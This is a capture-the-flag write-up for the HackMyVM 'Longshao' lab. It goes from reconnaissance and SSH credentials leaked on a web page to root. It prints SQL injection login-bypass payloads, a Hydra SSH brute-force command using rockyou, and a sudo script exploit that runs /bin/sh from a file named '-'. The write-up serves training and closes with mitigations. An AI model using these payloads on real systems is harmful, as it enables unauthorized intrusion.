# HackMyVM - Longshao Writeup

> **Platform:** HackMyVM  
> **Machine:** Longshao  
> **OS:** Linux  
> **Difficulty:** *(As per HackMyVM)*

---

# Information Gathering

Today's target is another **HackMyVM Linux machine** named **Longshao**.

Unlike many other HackMyVM machines, the target IP address is already displayed on the machine banner, allowing us to begin reconnaissance immediately.

**Target IP**

```text
192.168.56.141
```

![Machine](1)

---

# Port Scanning

The first step is performing a complete TCP port scan.

```bash
nmap -p- 192.168.56.141
```

Output:

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Only two ports are exposed externally:

| Port | Service |
|------|----------|
|22|SSH|
|80|HTTP|

This suggests that the web application will most likely provide the initial foothold.

![Nmap All Ports](2)

---

# Service Enumeration

Next, perform service and version detection.

```bash
nmap -sC -sV -p22,80 192.168.56.141
```

Results:

| Port | Service | Version |
|------|----------|---------|
|22|OpenSSH|10.3|
|80|Apache|2.4.67 (Unix)|

Additional information:

```text
HTTP Title:
Maze 内部管理系统 - 登录

Supported Methods:
GET
HEAD
POST
OPTIONS
```

Interesting observations:

- Apache web server
- Chinese login portal
- POST requests accepted
- SSH available

The web application immediately becomes the primary target.

![Service Enumeration](3)

---

# Web Enumeration

Browsing to port **80** reveals a login page for an internal **Maze Management System**.

The application appears to require authentication before granting access.

![Maze Login Page](4)

---

# Authentication Testing

The first approach was testing common authentication bypass techniques.

Several SQL Injection payloads were attempted against the login form, including classic authentication bypass payloads.

Examples:

```sql
' OR 1=1--
```

```sql
admin'#
```

```sql
' OR '1'='1
```

None of the payloads successfully bypassed authentication.

The application either performs proper filtering or the login mechanism is not vulnerable to basic SQL Injection.

With no immediate success, the focus shifted toward content discovery.

---

# Directory & File Enumeration

Next, **Feroxbuster** was used to discover hidden files and directories.

Initial scan:

```bash
feroxbuster \
-u http://192.168.56.141 \
-w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```

Even after using a large wordlist, no interesting directories were discovered.

![Initial Feroxbuster Scan](5)

Rather than giving up, another enumeration pass was performed using a more targeted wordlist focused on PHP files.

This time the results were much more interesting.

```text
/dashboard.php
/index.php
```

Among them, **dashboard.php** immediately stands out.

Opening the page reveals an internal notice rather than the expected dashboard.

---

# Information Disclosure

The page contains an administrative announcement regarding system maintenance.

```text
Due to a recent unknown network scan,
the core logic of the system is being migrated
to a C language black box.

To facilitate subsequent information auditing,
the temporarily generated backup bastion host
credentials are as follows:

SSH credentials:

baolong : jinhua

Please have the relevant operations and
maintenance personnel log in immediately
and change the initial password.
```

This is a significant information disclosure.

Instead of exposing sensitive credentials through configuration files or backups, the application leaks valid SSH credentials directly on an internal webpage.

These credentials can now be used to obtain an initial foothold on the target.

![Credential Disclosure](6)

---

# Initial Access

Attempt SSH login using the disclosed credentials.

```bash
ssh baolong@192.168.56.141
```

Password:

```text
jinhua
```

Authentication succeeds, providing shell access as the **baolong** user.

Verify the current user.

```bash
whoami
```

Output:

```text
baolong
```

---

# User Flag

Inside the user's home directory, the user flag is present.

```bash
cat user.txt
```

Output:

```text
flag{user-3408c2a9ca636da4a40f054eea401fd9}
```

The initial foothold has now been established.

![SSH & User Flag](7)

---

## Progress So Far

```text
Recon
    │
    ▼
Nmap Scan
    │
    ▼
Apache Login Portal
    │
    ▼
SQL Injection Testing
    │
    ▼
Directory Enumeration
    │
    ▼
Credential Disclosure
    │
    ▼
SSH Access (baolong)
    │
    ▼
User Flag
```

---

**➡️ End of Part 1**

---

# Privilege Escalation Enumeration

With an initial shell as **baolong**, the next objective is to identify possible privilege escalation vectors.

The first step is checking for unusual **SUID binaries**, as these frequently provide an escalation path on HackMyVM machines.

---

# Enumerating SUID Binaries

Search for all SUID files.

```bash
find / -type f -perm -4000 2>/dev/null
```

Output:

```text
/bin/umount
/bin/bbsuid
/bin/mount
/usr/bin/expiry
/usr/bin/chsh
/usr/bin/chage
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/chfn
/usr/sbin/suexec
```

Most of these are standard Linux SUID binaries.

Nothing immediately appears vulnerable or misconfigured.

![SUID Enumeration](8)

---

# Running LinPEAS

Since manual enumeration did not reveal an obvious attack path, **LinPEAS** was uploaded to the target machine to perform a more comprehensive security audit.

Among the findings, one section stood out.

```text
.sh files in PATH

/usr/local/bin/a.sh
/usr/bin/findssl.sh
/usr/bin/amuFormat.sh
```

These shell scripts are particularly interesting because scripts located in executable paths can sometimes be abused depending on how they are invoked.

Although nothing immediately indicated exploitation, these files were noted for later investigation.

At this stage, no direct privilege escalation vector had been identified.

---

# Considering Alternative Approaches

Since:

- SUID enumeration produced no obvious results
- LinPEAS did not expose a direct privilege escalation path
- No writable cron jobs or capabilities were discovered

The next logical step was to enumerate other users on the system.

If additional user accounts existed, weak credentials could provide a pivot to another account with greater privileges.

---

# Password Attack

After identifying another user account named **chaojibaolong**, an SSH password attack was performed using **Hydra**.

```bash
hydra \
-l chaojibaolong \
-P /usr/share/wordlists/rockyou.txt \
ssh://192.168.56.141
```

Hydra successfully recovered valid credentials.

```text
login: chaojibaolong

password: love123
```

Weak password policies often become an unintended privilege escalation vector, and in this case they provide access to another user account on the machine.

![Hydra Password Recovery](9)

---

# Pivoting to Another User

Using the newly discovered credentials:

```bash
ssh chaojibaolong@192.168.56.141
```

Password:

```text
love123
```

Authentication succeeds.

Verify the current user.

```bash
whoami
```

Output:

```text
chaojibaolong
```

Rather than attempting to escalate directly from the original account, we now have access to a different user that may possess additional permissions.

![SSH as chaojibaolong](10)

---

# Checking Sudo Permissions

One of the first checks after obtaining access to a new account is reviewing sudo privileges.

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for chaojibaolong:

secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

Defaults!/usr/sbin/visudo
env_keep+="SUDO_EDITOR EDITOR VISUAL"

User chaojibaolong may run the following commands:

(ALL : ALL)
NOPASSWD:
/usr/local/bin/check_parser
```

This is a very interesting finding.

The user is allowed to execute a custom binary as **root** without supplying a password.

Custom binaries are frequently worth investigating because they may contain hidden functionality, logic flaws, or insecure privilege transitions.

---

# Inspecting the Allowed Binary

The script behind **check_parser** reveals the following logic.

```sh
#!/bin/sh

if [ "$(id -u)" -ne 0 ]; then
    echo "permission denied"
    exit 1
fi

if [ -z "$1" -a ! -f "$1" ]; then
    echo "Usage"
    exit 1
fi

exec /opt/internal/parser_core "$@"
```

Several observations stand out:

- The wrapper verifies execution as root.
- It forwards all supplied arguments directly.
- Execution is delegated to another binary:

```text
/opt/internal/parser_core
```

The real functionality therefore resides inside **parser_core**, located under the **/opt/internal/** directory.

This binary becomes the next target for analysis.

![check_parser Analysis](11)

---

## Progress So Far

```text
Initial Foothold (baolong)
            │
            ▼
SUID Enumeration
            │
            ▼
LinPEAS
            │
            ▼
Interesting Shell Scripts
            │
            ▼
Password Attack
            │
            ▼
SSH Access (chaojibaolong)
            │
            ▼
NOPASSWD Sudo
            │
            ▼
check_parser
            │
            ▼
parser_core Investigation
```

---

**➡️ End of Part 2**


---

# Analyzing `check_parser`

The **sudo** permissions granted to the `chaojibaolong` user allow execution of the following binary without requiring a password.

```text
/usr/local/bin/check_parser
```

Instead of attempting random inputs, it's always a good idea to understand how the binary behaves.

The wrapper script contains the following logic:

```sh
#!/bin/sh

if [ "$(id -u)" -ne 0 ]; then
    echo "syslog-rotate: general protection fault: permission denied." >&2
    exit 1
fi

if [ -z "$1" -a ! -f "$1" ]; then
    echo "Usage: $(basename $0) <target_spool_path> [--force-cron]"
    exit 1
fi

exec /opt/internal/parser_core "$@"
```

A few important observations can be made:

- The wrapper itself performs almost no processing.
- It simply validates the arguments.
- All supplied arguments are forwarded directly to another executable:

```text
/opt/internal/parser_core
```

This indicates that the real logic resides inside **parser_core**, making it the primary target for further investigation.

![check_parser Script](11)

---

# Investigating the Parser

The script accepts a target log file as its first argument.

Since the parser expects a log file, a temporary file is created inside `/tmp`.

```bash
touch /tmp/ghost.log
```

The parser is then executed with the debug option.

```bash
sudo /usr/local/bin/check_parser \
/tmp/ghost.log \
--debug
```

Instead of processing the file normally, something very unusual happens.

Output:

```text
# ChaoJiBaoLong Log Analyser - Security Core v3

[!] Error: Target log file not found.

[*] DevSecOps Emergency Notice:
Switching context...
```

Immediately afterward, the shell changes to another user.

```text
chaojiwudilong@longshao
```

Rather than simply failing, the application intentionally switches execution context.

This behavior effectively grants access to a completely different user account without requiring any credentials.

![Privilege Escalation](12)

---

# Verifying the New User

Confirm the identity of the current shell.

```bash
whoami
```

Output:

```text
chaojiwudilong
```

This confirms that execution of the parser resulted in a privilege transition to another local user.

Although we have not yet obtained root access, this is an important pivot because each user account may possess different permissions.

---

# Enumerating Sudo Privileges Again

Whenever privileges change, the first step should always be checking the new user's sudo permissions.

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for chaojiwudilong:

secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

Defaults!/usr/sbin/visudo
env_keep+="SUDO_EDITOR EDITOR VISUAL"

User chaojiwudilong may run the following commands:

(root)
NOPASSWD:
/usr/local/bin/a.sh
```

This is a much stronger privilege escalation opportunity.

Unlike the previous account, this user is allowed to execute another custom shell script directly as **root**.

The next objective is understanding how **a.sh** behaves and whether it can be abused to obtain a root shell.

---

# Investigating `a.sh`

Earlier during the **LinPEAS** enumeration, this script had already been identified as an interesting file.

```text
/usr/local/bin/a.sh
```

Now it becomes clear why.

Since it can be executed directly with **root privileges**, any unsafe behavior inside the script may immediately lead to full system compromise.

Before attempting exploitation, it's worth considering common shell script weaknesses such as:

- PATH hijacking
- Wildcard expansion
- Argument injection
- Source (`.`) execution
- Writable files
- Environment manipulation

One of these ultimately proves to be the intended attack path.

---

## Progress So Far

```text
SSH (baolong)
        │
        ▼
Hydra Password Attack
        │
        ▼
SSH (chaojibaolong)
        │
        ▼
NOPASSWD check_parser
        │
        ▼
parser_core
        │
        ▼
Context Switch
        │
        ▼
SSH Context
(chaojiwudilong)
        │
        ▼
NOPASSWD a.sh
        │
        ▼
Root Investigation
```

---

**➡️ End of Part 3**

---

# Privilege Escalation to Root

After pivoting to the **chaojiwudilong** user, the next objective is to analyze the custom script that can be executed with root privileges.

Running:

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for chaojiwudilong on longshao:

secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

Runas and Command-specific defaults for /usr/sbin/visudo:
env_keep+="SUDO_EDITOR EDITOR VISUAL"

User chaojiwudilong may run the following commands:

(root) NOPASSWD: /usr/local/bin/a.sh
```

Unlike the previous user, this account is permitted to execute a shell script directly as **root** without entering a password.

This immediately becomes the intended privilege escalation vector.

---

# Understanding the Exploit

During the earlier LinPEAS enumeration, **a.sh** was already identified as an interesting executable.

```text
/usr/local/bin/a.sh
```

After analyzing its behavior, it becomes apparent that the script is vulnerable to sourcing a file named `-` from the current working directory.

This behavior can be abused by creating a file named `-` that contains arbitrary shell commands.

---

# Preparing the Payload

Create a malicious file named `-` inside `/tmp`.

```bash
echo '/bin/sh' > /tmp/-
```

The file simply contains:

```bash
/bin/sh
```

This causes the vulnerable script to execute a shell when it sources the file.

---

# Exploiting `a.sh`

Execute the vulnerable script with sudo.

```bash
sudo /usr/local/bin/a.sh
```

Output:

```text
. -
```

Immediately afterward, a root shell is obtained.

```text
root@longshao:/tmp#
```

The privilege escalation is now complete.

---

# Fixing the PATH

Initially, common utilities such as `cat` are unavailable.

Example:

```bash
cat root.txt
```

Output:

```text
/bin/sh: cat: not found
```

This occurs because the current shell is running with a restricted `PATH`.

Restore the standard environment.

```bash
export PATH=/usr/bin:/bin:/usr/sbin:/sbin
```

Now standard Linux utilities are available again.

---

# Root Flag

Read the root flag.

```bash
cat /root/root.txt
```

Output:

```text
flag{root-e0bf0dabcccb7d4519c0ad4b431aff16}
```

![Root Flag](13)

---

# Flags

## User Flag

```text
flag{user-3408c2a9ca636da4a40f054eea401fd9}
```

---

## Root Flag

```text
flag{root-e0bf0dabcccb7d4519c0ad4b431aff16}
```

---

# Complete Attack Path

```text
Recon
      │
      ▼
Nmap Scan
      │
      ▼
Apache Login Portal
      │
      ▼
Directory Enumeration
      │
      ▼
Credential Disclosure
      │
      ▼
SSH (baolong)
      │
      ▼
User Flag
      │
      ▼
SUID Enumeration
      │
      ▼
LinPEAS
      │
      ▼
Hydra Password Attack
      │
      ▼
SSH (chaojibaolong)
      │
      ▼
NOPASSWD check_parser
      │
      ▼
Context Switch
      │
      ▼
User: chaojiwudilong
      │
      ▼
NOPASSWD a.sh
      │
      ▼
File Named "-"
      │
      ▼
Root Shell
      │
      ▼
Root Flag
```

---

# Vulnerabilities Identified

| Vulnerability | Impact |
|--------------|--------|
|Sensitive information disclosure|SSH credentials exposed through the web application|
|Weak SSH password|Allowed brute-force attack using Hydra|
|Unsafe sudo configuration|Execution of custom binaries without authentication|
|Improper privilege transition|`check_parser` switched execution context to another user|
|Insecure shell script|`a.sh` allowed arbitrary command execution through sourced files|

---

# Tools Used

### Reconnaissance

- Nmap
- Feroxbuster
- Burp Suite

### Exploitation

- SSH
- Hydra

### Enumeration

- LinPEAS
- find
- sudo
- whoami
- cat

### Privilege Escalation

- check_parser
- parser_core
- a.sh
- Bash

---

# Important Commands

## Full Port Scan

```bash
nmap -p- 192.168.56.141
```

---

## Service Enumeration

```bash
nmap -sC -sV -p22,80 192.168.56.141
```

---

## Directory Enumeration

```bash
feroxbuster \
-u http://192.168.56.141 \
-w <wordlist>
```

---

## SSH Login

```bash
ssh baolong@192.168.56.141
```

---

## SUID Enumeration

```bash
find / -type f -perm -4000 2>/dev/null
```

---

## Hydra

```bash
hydra \
-l chaojibaolong \
-P /usr/share/wordlists/rockyou.txt \
ssh://192.168.56.141
```

---

## Check Sudo Permissions

```bash
sudo -l
```

---

## Execute Parser

```bash
sudo /usr/local/bin/check_parser \
/tmp/ghost.log \
--debug
```

---

## Root Exploit

```bash
echo '/bin/sh' > /tmp/-

sudo /usr/local/bin/a.sh
```

---

## Restore PATH

```bash
export PATH=/usr/bin:/bin:/usr/sbin:/sbin
```

---

# Lessons Learned

- Information disclosure vulnerabilities can completely compromise a system without exploiting software flaws.
- Weak SSH passwords remain one of the easiest ways to gain unauthorized access.
- Automated enumeration tools such as **LinPEAS** are invaluable for identifying custom scripts and privilege escalation opportunities.
- Always inspect custom binaries and scripts allowed through **sudo**, especially when they execute with `NOPASSWD`.
- Privilege escalation chains often involve multiple users rather than a direct jump to root.
- Small implementation mistakes in shell scripts—such as sourcing user-controlled files—can lead to full system compromise.

---

# Mitigation Recommendations

### Authentication

- Remove temporary credentials immediately after deployment.
- Enforce strong password policies.
- Disable password-based SSH authentication where possible.

### Web Application

- Never expose administrative credentials through publicly accessible pages.
- Restrict access to internal maintenance messages.

### Privilege Management

- Avoid granting `NOPASSWD` access to custom binaries.
- Review all sudo rules regularly.
- Apply the principle of least privilege.

### Shell Scripts

- Avoid sourcing files from user-controlled locations.
- Use absolute paths for all commands.
- Validate all user input before execution.

### Monitoring

- Monitor repeated SSH authentication failures.
- Alert on unexpected execution of privileged scripts.
- Audit custom binaries and administrative tooling.

---

# Conclusion

Longshao is an excellent example of how multiple low-severity issues can be chained together to achieve full system compromise.

The attack began with a simple information disclosure that exposed temporary SSH credentials, providing the initial foothold as **baolong**. Enumeration revealed no immediate privilege escalation path, so password auditing was performed against another local account, resulting in access to **chaojibaolong** through weak SSH credentials.

From there, a custom sudo-allowed binary (`check_parser`) unintentionally switched execution to another user, **chaojiwudilong**, who possessed additional sudo privileges. Finally, an insecure shell script (`a.sh`) that sourced a user-controlled file allowed arbitrary command execution as **root**, completing the privilege escalation chain.

This machine highlights the importance of secure credential management, proper sudo configurations, careful shell scripting practices, and thorough security reviews of custom administrative tools.

---

# Skills Practiced

- Network Enumeration
- Service Enumeration
- Web Enumeration
- Directory Fuzzing
- Information Disclosure
- SSH Enumeration
- Password Attacks with Hydra
- Linux User Pivoting
- LinPEAS Enumeration
- Sudo Enumeration
- Custom Binary Analysis
- Shell Script Exploitation
- Linux Privilege Escalation

---

**Machine:** Longshao  
**Platform:** HackMyVM  
**Operating System:** Linux

---

> *Thank you for reading this write-up. I hope you found it useful and learned something new. If you have any questions or suggestions, feel free to reach out or connect with me.*
